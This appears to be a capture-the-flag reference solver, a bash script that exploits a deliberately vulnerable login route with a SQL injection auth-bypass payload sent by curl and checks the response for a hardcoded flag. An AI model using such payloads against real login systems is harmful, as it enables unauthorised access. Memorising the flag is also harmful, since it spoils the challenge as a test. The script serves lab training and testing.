#!/usr/bin/env bash
# solvers/p1_1.sh, Task 1.1 "Gate of Trust" canonical exploit.
#
# The login route builds its query with raw string concatenation:
#   SELECT * FROM applicants WHERE username='{u}' AND password='{p}'
# Closing the username string and appending an always-true OR clause lets
# any password authenticate as the first row MariaDB returns (the admin
# row, since it's id=1), a classic string-based SQLi auth bypass.
set -uo pipefail

BASE="${SEIYAKU_BASE:-http://localhost:8000}"
FLAG="SEIYAKU{the_vow_was_never_sealed}"

echo "[p1_1] POST ${BASE}/p1/gate, auth-bypass payload"
resp=$(curl -s -X POST "${BASE}/p1/gate" \
    --data-urlencode "username=' OR '1'='1' -- " \
    --data-urlencode "password=whatever")

if echo "$resp" | grep -qF "$FLAG"; then
    echo "  ok: response contains flag: ${FLAG}"
    echo "[p1_1] PASS"
    exit 0
else
    echo "  FAIL: response did not contain the flag"
    echo "---- response body ----"
    echo "$resp"
    echo "------------------------"
    echo "[p1_1] FAIL"
    exit 1
fi
